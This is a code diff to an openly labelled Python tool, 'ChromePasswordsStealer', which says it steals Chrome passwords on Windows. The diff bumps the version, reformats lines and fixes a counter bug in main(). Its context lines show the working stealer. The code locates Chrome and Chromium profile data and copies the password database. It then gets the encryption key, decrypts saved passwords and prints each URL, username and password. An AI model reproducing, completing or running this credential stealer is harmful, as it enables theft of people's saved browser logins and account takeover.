@@ -33,7 +33,7 @@ This module steals chrome passwords on Windows.
 >>> stealer.save_and_clean()
 """
 
-__version__ = "2.0.0"
+__version__ = "2.0.1"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -90,7 +90,9 @@ class ChromePasswordsStealer:
 
     def __init__(self, filename: str = None, save_all: bool = False):
         user_data = self.user_data = join(
-            environ["USERPROFILE"].replace(environ.get('USERNAME', basename(environ["USERPROFILE"])), '*'),
+            environ["USERPROFILE"].replace(
+                environ.get("USERNAME", basename(environ["USERPROFILE"])), "*"
+            ),
             "AppData",
             "Local",
             "Google",
@@ -126,7 +128,6 @@ class ChromePasswordsStealer:
         self.cursor = None
 
     def get_filename(self, filename: str, extension: str) -> str:
-
         """
         This function returns a filename to save file.
         """
@@ -137,7 +138,6 @@ class ChromePasswordsStealer:
         )
 
     def get_database_cursor(self) -> bool:
-
         """
         This function copies and connects to the Chrome password database.
         """
@@ -154,7 +154,6 @@ class ChromePasswordsStealer:
         return True
 
     def get_key(self) -> bytes:
-
         """
         This function returns the encryption key.
         """
@@ -185,7 +184,6 @@ class ChromePasswordsStealer:
         return key
 
     def decrypt_password(self, password: bytes) -> str:
-
         """
         This function decrypts chrome password.
         """
@@ -209,7 +207,6 @@ class ChromePasswordsStealer:
             )
 
     def get_credentials(self) -> Iterator[Tuple[str, str, str]]:
-
         """
         This function get credentials from the database cursor.
         """
@@ -246,7 +243,6 @@ class ChromePasswordsStealer:
             self.free_database()
 
     def free_database(self) -> None:
-
         """
         This function free database cursor and connection.
         """
@@ -255,7 +251,6 @@ class ChromePasswordsStealer:
         self.connection.close()
 
     def save_and_clean(self) -> None:
-
         """
         This function copies and removes temp files and closes connection.
         """
@@ -296,7 +291,9 @@ class ChromiumPasswordsStealer(ChromePasswordsStealer):
         )
 
         user_data = self.user_data = join(
-            environ["USERPROFILE"].replace(environ.get('USERNAME', basename(environ["USERPROFILE"])), '*'),
+            environ["USERPROFILE"].replace(
+                environ.get("USERNAME", basename(environ["USERPROFILE"])), "*"
+            ),
             "AppData",
             "Local",
             "Google",
@@ -322,7 +319,6 @@ class ChromiumPasswordsStealer(ChromePasswordsStealer):
 
 
 def parse_args() -> Namespace:
-
     """
     This function parse arguments.
     """
@@ -351,7 +347,6 @@ def parse_args() -> Namespace:
 
 
 def main(argv: List[str] = argv[1:]) -> int:
-
     """
     This function starts the ChromePasswordStealer
     from the command line.
@@ -372,17 +367,22 @@ def main(argv: List[str] = argv[1:]) -> int:
     stealers = (ChromePasswordsStealer, ChromiumPasswordsStealer)
     filename = arguments.filename
     save_all = arguments.save_all
+    counter = 0
 
     for stealer in stealers:
-        stealer = stealer(
-            filename and f"{filename}{counter}", save_all
-        )
+        stealer = stealer(filename and f"{filename}{counter}", save_all)
+        counter += 1
         printf(f"Stealer created, save filename: {stealer.filename!r}")
 
         for url, username, password, directory in stealer.get_credentials():
             printf("Found credentials in: " + repr(directory))
-            printf("Get encryption key: " + repr(b16encode(stealer.get_key() or b'').decode()))
-            printf(f"Get credentials for {url!r}: {username!r} " + repr(password))
+            printf(
+                "Get encryption key: "
+                + repr(b16encode(stealer.get_key() or b"").decode())
+            )
+            printf(
+                f"Get credentials for {url!r}: {username!r} " + repr(password)
+            )
 
         stealer.save_and_clean()
         printf("Temp files are cleaned, credentials are saved.", "INFO")
